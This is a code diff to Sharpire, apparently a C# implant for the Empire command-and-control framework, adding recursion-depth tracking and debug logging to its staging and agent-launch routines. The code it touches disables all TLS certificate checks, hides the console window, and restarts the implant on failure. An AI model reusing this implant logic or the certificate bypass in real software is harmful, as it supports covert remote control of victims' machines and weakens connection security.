@@ -110,6 +110,11 @@ namespace Sharpire
 
         private byte[] stagingKeyBytes;
 
+        // Debugging variables to track recursion
+        private static int executeDepth = 0;
+        private static int dotNetEmpireDepth = 0;
+        private const int MAX_RECURSION_DEPTH = 100; // High limit just to log before crash
+
         public class RoutingPacket
         {
             public byte[] InitializationVector { get; set; }
@@ -155,49 +160,83 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         public void Execute()
         {
-            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+            executeDepth++;
+
             try
             {
+                // Log entry
+                string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] Execute() ENTER - Depth: {executeDepth}\n";
+                Console.WriteLine(logEntry.TrimEnd());
+                try { System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log", logEntry); } catch { }
 
-                var stage1Response = Stage1();
-                Stage2(stage1Response);
+                if (executeDepth > MAX_RECURSION_DEPTH)
+                {
+                    string warning = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] WARNING: Execute() depth exceeded {MAX_RECURSION_DEPTH}\n";
+                    Console.WriteLine(warning.TrimEnd());
+                    try { System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log", warning); } catch { }
+                }
 
+                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                 try
                 {
+
+                    var stage1Response = Stage1();
+                    Stage2(stage1Response);
+
+                    try
+                    {
 #if (PRINT)
-                    Console.WriteLine("Launching Empire");
-                    IntPtr handle = Misc.GetConsoleWindow();
-                    Misc.ShowWindow(handle, Misc.SW_HIDE);
+                        Console.WriteLine("Launching Empire");
+                        IntPtr handle = Misc.GetConsoleWindow();
+                        Misc.ShowWindow(handle, Misc.SW_HIDE);
 #endif
 
-                    DotNetEmpire();
+                        DotNetEmpire();
+                    }
+                    catch (Exception innerEx)
+                    {
+                        string errLog = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] Execute() inner catch - {innerEx.GetType().Name}: {innerEx.Message}\n";
+                        Console.WriteLine(errLog.TrimEnd());
+                        try { System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log", errLog + innerEx.StackTrace + "\n"); } catch { }
+
+                        GC.Collect();
+                        Execute();
+                    }
                 }
-                catch
+                catch (WebException webError)
                 {
-                    GC.Collect();
-                    Execute();
+                    string errLog = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] Execute() WebException: {webError.Message}\n";
+                    Console.WriteLine(errLog.TrimEnd());
+                    try { System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log", errLog + webError.StackTrace + "\n"); } catch { }
+
+                    if ((int)((HttpWebResponse)webError.Response).StatusCode == 500)
+                    {
+                        GC.Collect();
+                        Execute();
+                    }
+                    else
+                    {
+                        throw;
+                    }
                 }
-            }
-            catch (WebException webError)
-            {
-                if ((int)((HttpWebResponse)webError.Response).StatusCode == 500)
+                catch (Exception error)
                 {
-                    GC.Collect();
-                    Execute();
+                    string errLog = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] Execute() Exception: {error.ToString()}\n";
+                    Console.WriteLine(errLog.TrimEnd());
+                    try { System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log", errLog); } catch { }
                 }
-                else
+                finally
                 {
-                    throw;
+                    sessionInfo = null;
+                    stagingKeyBytes = null;
                 }
-            }
-            catch (Exception error)
-            {
-                Console.WriteLine(error.ToString());
             }
             finally
             {
-                sessionInfo = null;
-                stagingKeyBytes = null;
+                executeDepth--;
+                string logExit = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] Execute() EXIT  - Depth: {executeDepth}\n";
+                Console.WriteLine(logExit.TrimEnd());
+                try { System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log", logExit); } catch { }
             }
         }
 
@@ -451,16 +490,44 @@ namespace Sharpire
 
         private void DotNetEmpire()
         {
-            Agent agent = new Agent(sessionInfo);
-            agent.GetComs();
+            dotNetEmpireDepth++;
+
             try
             {
-                agent.Execute();
+                // Log entry
+                string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] DotNetEmpire() ENTER - Depth: {dotNetEmpireDepth}\n";
+                Console.WriteLine(logEntry.TrimEnd());
+                try { System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log", logEntry); } catch { }
+
+                if (dotNetEmpireDepth > MAX_RECURSION_DEPTH)
+                {
+                    string warning = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] WARNING: DotNetEmpire() depth exceeded {MAX_RECURSION_DEPTH}\n";
+                    Console.WriteLine(warning.TrimEnd());
+                    try { System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log", warning); } catch { }
+                }
+
+                Agent agent = new Agent(sessionInfo);
+                agent.GetComs();
+                try
+                {
+                    agent.Execute();
+                }
+                catch (Exception ex)
+                {
+                    string errLog = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] DotNetEmpire() Exception - {ex.GetType().Name}: {ex.Message}\n";
+                    Console.WriteLine(errLog.TrimEnd());
+                    try { System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log", errLog + ex.StackTrace + "\n"); } catch { }
+
+                    GC.Collect();
+                    DotNetEmpire();
+                }
             }
-            catch (Exception)
+            finally
             {
-                GC.Collect();
-                DotNetEmpire();
+                dotNetEmpireDepth--;
+                string logExit = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss.fff}] DotNetEmpire() EXIT  - Depth: {dotNetEmpireDepth}\n";
+                Console.WriteLine(logExit.TrimEnd());
+                try { System.IO.File.AppendAllText("C:\\Windows\\Temp\\sharpire_debug.log", logExit); } catch { }
             }
         }
 
